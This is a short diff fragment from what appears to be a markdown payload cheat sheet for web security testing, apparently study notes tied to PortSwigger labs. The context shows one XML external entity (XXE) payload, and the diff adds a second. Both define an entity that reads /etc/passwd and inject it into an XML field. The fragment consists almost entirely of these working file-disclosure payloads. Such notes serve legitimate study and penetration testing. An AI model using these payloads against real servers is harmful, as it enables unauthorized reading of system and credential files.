@@ -313,6 +313,21 @@ https://portswigger.net/web-security/deserialization
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <fieldname><productId>&xxe;</productId></fieldname>
+
+--------------------------
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+
+<root>
+<field1>
+</field1>
+<field2>
+</field2>
+<field3>
+&xxe;
+</field3>
+</root>
 ```
 
 ### xss via file upload
